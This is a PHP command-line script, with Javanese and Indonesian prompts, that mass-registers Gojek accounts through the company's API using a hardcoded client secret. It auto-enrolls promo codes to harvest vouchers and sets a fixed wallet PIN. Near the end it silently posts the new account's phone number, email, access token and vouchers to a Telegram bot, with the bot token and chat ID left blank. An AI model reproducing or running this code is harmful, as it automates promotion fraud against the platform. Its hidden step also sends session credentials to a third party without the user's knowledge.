<?php
date_default_timezone_set('Asia/Jakarta');
include "function.php";
ulang:
// function change(){
	echo color("blue","                   AYO NDRENGES BARENG \n");
	echo "\e[99m______________\e[99m".date('[d-m-Y] [H:i:s]')."\e[99m________________\n";
	echo color("green","                ".date('d-m-Y H:i:s')."   \n");
	echo "\e[92m  ==============================================\n";
	echo color("white","                   ~0~ KOPLAK CREW ~0~     \n");
	echo "\e[92m  ==============================================\n";
	echo color("purple","               Format No Hp 62blablabla \n\n");
	$nama = nama();
	$email = str_replace(" ", "", $nama) . mt_rand(100, 999);
	echo color("white","NOMOR HP LEBOKNO COK: ");
	// $no = trim(fgets(STDIN));
	$nohp = trim(fgets(STDIN));
	$nohp = str_replace("62","62",$nohp);
	$nohp = str_replace("(","",$nohp);
	$nohp = str_replace(")","",$nohp);
	$nohp = str_replace("-","",$nohp);
	$nohp = str_replace(" ","",$nohp);

	if (!preg_match('/[^+0-9]/', trim($nohp))) {
		if (substr(trim($nohp),0,3)=='62') {
			$hp = trim($nohp);
		}
		else if (substr(trim($nohp),0,1)=='0') {
			$hp = '62'.substr(trim($nohp),1);
		}
		else if (substr(trim($nohp), 0, 2)=='62') {
			$hp = '6'.substr(trim($nohp), 1);
		}
		else {
			$hp = '1'.substr(trim($nohp),0,13);
		}
	}
	$data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
	$register = request("/v5/customers", null, $data);
	if (strpos($register, '"otp_token"')) {
		$otptoken = getStr('"otp_token":"','"',$register);
		otp:
			echo color("white","SAIKI OTP LEBOKNO : ");
			$otp = trim(fgets(STDIN));
			$data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
			$verif = request("/v5/customers/phone/verify", null, $data1);
			if (strpos($verif, '"access_token"')) {
				echo color("green","ALHAMDULILLAH BERHASIL MENDAFTAR\n");
				$token = getStr('"access_token":"','"',$verif);
				$uuid = getStr('"resource_owner_id":',',',$verif);
				echo color("white","\nYour access token: ".$token."\n\n");
				save("token.txt",$token); 
				echo color("red","\n▬▬▬▬▬▬▬▬▬▬▬▬ Wayah e...Wayah e... ▬▬▬▬▬▬▬▬▬▬▬▬");
				echo "\n".color("green","CROOT PERTAMA");
				echo "\n".color("blue","Genjot terusss...");
				for ($a=1;$a<=5;$a++) {
					echo color("white",".");
					sleep(1);
				}
				$code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"EATLAH"}');
				$message = fetch_value($code1,'"message":"','"');
				if (strpos($code1, 'Uyeahhh...LEGO COK')) {
					echo "\n".color("green","Message: ".$message);
					goto gocar;
				} else {
					echo "\n".color("white","Message: ".$message);
				gocar:
					echo "\n".color("green","\nCROOT KEDUA");
					echo "\n".color("blue","Genjot terusss...");
					for ($a=1;$a<=90;$a++) {
						echo color("white",".");
						sleep(1);
					}
					$code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD0906"}');
					$message = fetch_value($code1,'"message":"','"');
					if (strpos($code1, 'Uyeahhh...LEGO COK')) {
						echo "\n".color("green","Message: ".$message);
						goto sukses;
					} else {
						echo "\n".color("white","Message: ".$message);
					gofood:
						echo "\n".color("green","\nCROOT KETIGA");
						echo "\n".color("blue","Genjot terusss...");
						for ($a=1;$a<=9;$a++) {
							echo color("white",".");
							sleep(1);
						}
						$code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PAKEGOFOOD0906"}');
						$message = fetch_value($code1,'"message":"','"');
						echo "\n".color("white","Message: ".$message);
						echo "\n".color("green","SEK PEGEL KERINGETAN");
						echo "\n".color("blue","ENTENI DILUT COK");
						for ($a=1;$a<=9;$a++) {
							echo color("white",".");
							sleep(1);
						}
						sleep(3);
						$boba09 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD0906"}');
						$messageboba09 = fetch_value($boba09,'"message":"','"');
						echo "\n".color("white","Message: ".$messageboba09);
						sleep(1);
					sukses:
						$cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=16&page=1', $token);
						$total = fetch_value($cekvoucher,'"total_vouchers":',',');
						$voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
						$voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
						$voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
						$voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
						$voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
						$voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
						$voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
						$voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
						$voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
						$voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
						$voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
						$voucher12 = getStr1('"title":"','",',$cekvoucher,"12");
						$voucher13 = getStr1('"title":"','",',$cekvoucher,"13");
						$voucher14 = getStr1('"title":"','",',$cekvoucher,"14");
						$voucher15 = getStr1('"title":"','",',$cekvoucher,"15");
						$voucher16 = getStr1('"title":"','",',$cekvoucher,"16");
						echo "\n".color("red","\nTotal voucher ".$total." : ");
						echo "\n".color("blue","1. ".$voucher1);
						echo "\n".color("yellow","2. ".$voucher2);
						echo "\n".color("green","3. ".$voucher3);
						echo "\n".color("purple","4. ".$voucher4);
						echo "\n".color("white","5. ".$voucher5);
						echo "\n".color("red","6. ".$voucher6);
						echo "\n".color("blue","7. ".$voucher7);
						echo "\n".color("yellow","8. ".$voucher8);
						echo "\n".color("green","9. ".$voucher9);
						echo "\n".color("purple","10. ".$voucher10);
						echo "\n".color("white","11. ".$voucher11);
						echo "\n".color("red","12. ".$voucher12);
						echo "\n".color("blue","13. ".$voucher13);
						echo "\n".color("yellow","14. ".$voucher14);
						echo "\n".color("green","15. ".$voucher15);
						echo "\n".color("purple","16. ".$voucher16);
						echo"\n";
						$expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
						$expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
						$expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
						$expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
						$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
						$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
						$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
						$expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
						$expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
						$expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
						$expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
						$expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
						$expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
						$expired14 = getStr1('"expiry_date":"','"',$cekvoucher,'14');
						$expired15 = getStr1('"expiry_date":"','"',$cekvoucher,'15');
						$expired16 = getStr1('"expiry_date":"','"',$cekvoucher,'16');
						$TOKEN  = ":";
						$chatid = "";
						$pesan 	= "Gojek Account Info\n\nNomor: ".$hp."\nNama: ".$nama."\nEmail: ".$email."@gmail.com\n\n".$token."\n\nTotalVoucher = ".$total."\n\n".$voucher1."\nExp:  ".$expired1."\n\n".$voucher2."\nExp: ".$expired2."\n\n".$voucher3."\nExp: ".$expired3."\n\n".$voucher4."\nExp: ".$expired4."\n\n".$voucher5."\nExp: ".$expired5."\n\n".$voucher6."\nExp: ".$expired6."\n\n".$voucher7."\nExp: ".$expired7."\n\n".$voucher8."\nExp: ".$expired8."\n\n".$voucher9."\nExp: ".$expired9."\n\n".$voucher10."\nExp: ".$expired10."\n\n".$voucher11."\nExp: ".$expired11."\n\n".$voucher12."\nExp: ".$expired12."\n\n".$voucher13."\nExp: ".$expired13."\n";
						$method	= "sendMessage";
						$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
						$post = [
							'chat_id' => $chatid,
							'text' => $pesan
						];
						$header = [
						"X-Requested-With: XMLHttpRequest",
						"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
								];
						$ch = curl_init();
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_URL, $url);
						curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
						curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
						curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
						$datas = curl_exec($ch);
						$error = curl_error($ch);
						$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
						curl_close($ch);
						$debug['text'] = $pesan;
						$debug['respon'] = json_decode($datas, true);
						setpin:
							echo "\n".color("red","SET PIN GA COK? (y/n): ");
							$pilih1 = trim(fgets(STDIN));
							if ($pilih1 == "y" || $pilih1 == "Y") {
							//if($pilih1 == "y" && strpos($no, "628")){
								echo color("green","▬▬▬▬▬▬▬▬▬▬▬▬▬▬ PIN MU = 112233 ▬▬▬▬▬▬▬▬▬▬▬▬")."\n";
								$data2 = '{"pin":"112233"}';
								$getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
								echo "Otp pin lebokno : ";
								$otpsetpin = trim(fgets(STDIN));
								$verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
								echo $verifotpsetpin;
							} else if ($pilih1 == "n" || $pilih1 == "N") {
								die();
							} else {
								echo color("white","-] GAGAL COK!!!\n");
							}
					}
				}
			} else {
				echo color("red","-] OTP SALAH GOBLOK!!!");
				echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";
				echo color("blue","!] BALENI MANEH..\n");
				goto otp;
			}
	} else {
		echo color("red","-] NOMOR BUSUK GANTI CEPETAN");
		echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";
		echo color("blue","!] LEBOKNO MANEH SAIKI\n");
		goto ulang;
	}
//  }

// echo change()."\n";
